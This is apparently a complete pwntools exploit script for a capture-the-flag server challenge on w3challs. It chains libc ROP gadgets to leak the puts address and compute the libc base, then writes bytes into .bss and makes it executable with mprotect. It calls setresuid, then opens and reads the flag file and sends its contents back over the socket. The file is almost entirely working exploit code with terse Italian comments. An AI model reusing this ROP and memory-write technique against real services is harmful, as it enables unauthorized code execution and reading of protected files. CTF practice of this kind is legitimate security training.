#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

exe = context.binary = ELF('server')

libc = ELF("libc.so.6")
pop_eax_ret_off = 0x00024b5e #pop eax; ret;
pop_ecx_ret_off = 0x001926d5 #pop ecx; ret;
pop_edx_ret_off = 0x00001aae #pop edx; ret;

inc_ptr_eax_ret_off = 0x00109c2d #inc dword ptr [eax]; ret;
inc_ptr_ecx_ret_off = 0x00046828 #inc dword ptr [ecx]; ret;

add_ptr_eax_0xa_ret_off = 0x001bd5c6 #add dword ptr [eax], 0xa; ret;
add_ptr_ecx_0xa_ret_off = 0x001ce53d #add dword ptr [ecx], 0xa; ret;

add_ptr_edx_dict = {0x76: 0x001a1b88, 0x74: 0x001a2c1c, 0x70: 0x001c0794, 0x6f: 0x001a834c,
                    0x6d: 0x001ac330, 0x51: 0x001ac71c}

def start(argv=[], *a, **kw):
    global libc
    '''Start the exploit against the target.'''
    if args.GDB:
        arg = remote("localhost", 40004, *a, **kw)
        gdb.attach(arg)
        return arg
    elif args.REMOTE:
        return remote("pwn.w3challs.com", 31312, *a, **kw)
    else:
        return remote("localhost", 40004, *a, **kw)

def rop_payload(rop_array):

    if(len(rop_array) > 6):
        log.failure("rop too big")

    payload = dict()

    for i in range(len(rop_array)):
        payload[prec_buf_off + (i+3)*addr_len] = rop_array[i]

    payload = fit(payload)
    io.sendline(payload)

def write_byte_slow(byte, write_addr, libc_start):

    global exe
    global io

    counter = 0
    res = 0

    #Ottimizzare ROP => codice da schifo
    for i in add_ptr_edx_dict.keys():

        if((counter + i) <= byte):

            rop_payload([libc_start + pop_edx_ret_off, write_addr, \
                         libc_start + add_ptr_edx_dict[i], exe.sym.handle_client, \
                        p32(0), p32(0x4)])

            counter += i

    while((counter + 0xa) <= byte):

        rop_payload([libc_start + pop_eax_ret_off, write_addr, \
                     libc_start + add_ptr_eax_0xa_ret_off, exe.sym.handle_client, \
                     p32(0), p32(0x4)])

        counter += 0xa

    while((counter + 1) <= byte):

        rop_payload([libc_start + pop_eax_ret_off, write_addr, \
                     libc_start + inc_ptr_eax_ret_off, exe.sym.handle_client, \
                     p32(0), p32(0x4)])

        counter += 1

    print(counter, end=" ")

def write_bytes_slow(byte_str, write_addr, libc_start):

    for i in range(len(byte_str)):
        write_byte_slow(byte_str[i], write_addr + i, libc_start)
    print("")

#Utilizzabile solo dopo aver scritto l'helper in memoria
def write_byte_fast(byte, write_addr, libc_start, ret_addr):

    rop_payload([libc.sym.wmemset, ret_addr, write_addr, p32(byte), p32(1)])

def write_str_fast(string, write_addr, libc_start, ret_addr):

    for i in range(len(string)):
        write_byte_fast(ord(string[i]), write_addr + i, libc_start, ret_addr)
    print("")

def exec_send(mem_addr, size, fd, ret_addr):

    global exe

    rop_payload([exe.sym.send, ret_addr, p32(fd), mem_addr, p32(size), p32(0)])


max_size_str = 4096
str_prefix = "The string that you just sent me is : "
addr_len = 4

prec_buf_off = max_size_str - len(str_prefix)

io = start()

#Leak puts address
exec_send(exe.sym.got.puts, 8, 4, exe.sym.exit)

#Retrieve libc base address
puts_addr = io.recv()[0:4]
libc.address = int.from_bytes(puts_addr, "little") - libc.sym.puts

#Memoria del processo di possibile interesse
data_start = 0x0804b000
clean_bss = 0x0804b0b0

#Solo 6 dword e 1/2 (inutilizzabile perche' 0 nel socket buffer) per fare il payload
#3 byte sono richiesti per ricominciare il ciclo di input
io = start()

handle_code = '''
push 0x4;
mov eax, 0x%x;
call eax;
''' % (exe.sym.handle_client)

#Helper usato per ridurre i byte usati nel payload per ripetere il recv da 3 a 1
#Permette di usare metodi di scrittura in memoria piu' veloci
write_bytes_slow(asm(handle_code), clean_bss, libc.address)

rop_payload([libc.sym.mprotect, clean_bss, data_start, p32(0x1000), p32(7)])

server_uid = 1028

rop_payload([libc.sym.setresuid, clean_bss, p32(server_uid), p32(server_uid), p32(server_uid)])

command = "/home/server/flag"

str_pos = clean_bss + 0x100

write_str_fast(command, str_pos, libc.address, clean_bss)

rop_payload([libc.sym.open, clean_bss, str_pos, p32(0)])

rop_payload([libc.sym.read, clean_bss, p32(0), str_pos, p32(50)])

exec_send(str_pos, 50, 4, exe.sym.exit)
print(io.recv())
